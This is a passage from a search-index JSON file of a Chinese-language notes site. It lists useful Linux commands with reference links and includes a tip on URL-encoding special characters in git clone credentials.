\u8d28\u56e0\u6570\u5206\u89e3 factor https://www.geek-share.com/detail/2750670155.html tr\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-tr.html \u4f38\u7f29\u4e00\u4e2a\u6587\u4ef6 truncate http://linux.51yip.com/search/truncate \u811a\u672c\u4e92\u65a5 flock\u547d\u4ee4 https://www.jianshu.com/p/fe5f0cf59f2d fuser\u547d\u4ee4 \u67e5\u770b\u4e00\u4e2a\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u7cfb\u7edf\u88ab\u54ea\u4e2a\u8fdb\u7a0b\u5360\u7528 https://blog.51cto.com/12107790/2321296 \u5c06\u5236\u8868\u7b26\u90fd\u8f6c\u6362\u6210\u7a7a\u683c expand\u547d\u4ee4 https://www.cnblogs.com/Spiro-K/p/6361948.html \u5c06\u7a7a\u683c\u90fd\u8f6c\u6362\u6210\u5236\u8868\u7b26 unexpand\u547d\u4ee4 https://ipcmen.com/unexpand getconf\u547d\u4ee4 https://blog.csdn.net/bytxl/article/details/9296435 \u968f\u673a\u751f\u6210\u5bc6\u7801 mkpasswd https://www.cnblogs.com/xiaoyongzhuo/p/7444303.html \u663e\u793acpu\u4e2a\u6570 nproc\u547d\u4ee4 https://idc.wanyunshuju.com/cym/623.html comm\u547d\u4ee4 \u6bd4\u8f83\u6570\u636e https://www.runoob.com/linux/linux-comm-comm.html readlink\u547d\u4ee4\u548crealpath\u547d\u4ee4\u5219\u5141\u8bb8\u4f60\u89e3\u6790\u6587\u4ef6\u4e4b\u95f4\u7684\u8fd9\u4e9b\u94fe\u63a5 https://www.cnblogs.com/kelamoyujuzhen/p/10119706.html pidof \u67e5\u627e\u67d0\u4e2a\u540d\u5b57\u7684\u8fdb\u7a0b https://blog.csdn.net/ygm_linux/article/details/40184413 ssh\u8fdc\u7a0b\u6267\u884c\u672c\u673a\u811a\u672c https://blog.csdn.net/yinzhipeng123/article/details/108366460 docker\u6267\u884c\u5bbf\u4e3b\u673a\u811a\u672c https://blog.csdn.net/yinzhipeng123/article/details/108366299 Python\u5236\u4f5cnmtui\u7c7b\u4f3c\u7684\u56fe\u5f62 https://www.cnblogs.com/Xjng/p/3869869.html python \u8d85\u7ea7\u597d\u7528\u591a\u7ebf\u7a0b\u5305\uff0c\u65e0\u8111\u5f00\u591a\u7ebf\u7a0b \uff0cpython \u4e8c\u4e09\u7248\u672c\u90fd\u884c https://docs.python.org/zh-cn/3.6/library/multiprocessing.html","title":"\u6709\u8da3\u547d\u4ee4\u96c6\u5408"},{"location":"tool/url_code/","text":"URL\u5728\u7ebf\u7f16\u7801\u8f6c\u6362\u5de5\u5177 Git\u514b\u9686\u901a\u8fc7 git clone http://username:password@remote \u53d1\u73b0\u4e0d\u597d\u4f7f\uff0c\u53d1\u73b0\u662f\u8d26\u53f7\u5bc6\u7801\u4e2d\u6709\u7279\u6b8a\u5b57\u7b26 \u6587\u7ae0\uff1ahttps://blog.csdn.net/pcyph/article/details/45010609 URL\u5728\u7ebf\u7f16\u7801\u8f6c\u6362\u5de5\u5177\uff1ahttp://tools.jb51.net/static/encodetxt/urlencode_decode/index.html","title":"URL\u5728\u7ebf\u7f16\u7801\u8f6c\u6362\u5de5\u5177"},{"location":"tool/url_code/#url","text":"Git\u514b\u9686\u901a\u8fc7 git clone http://username:password@remote \u53d1\u73b0\u4e0d\u597d\u4f7f\uff0c\u53d1\u73b0\u662f\u8d26\u53f7\u5bc6\u7801\u4e2d\u6709\u7279\u6b8a\u5b57\u7b26 \u6587\u7ae0\uff1ahttps://blog.csdn.net/pcyph/article/details/45010609 URL\u5728\u7ebf\u7f16\u7801\u8f6c\u6362\u5de5\u5177\uff1ahttp://tools.jb51.net/static/encodetxt/urlencode_decode/index.html","title":"URL\u5728\u7ebf\u7f16\u7801\u8f6c\u6362\u5de5\u5177"}]}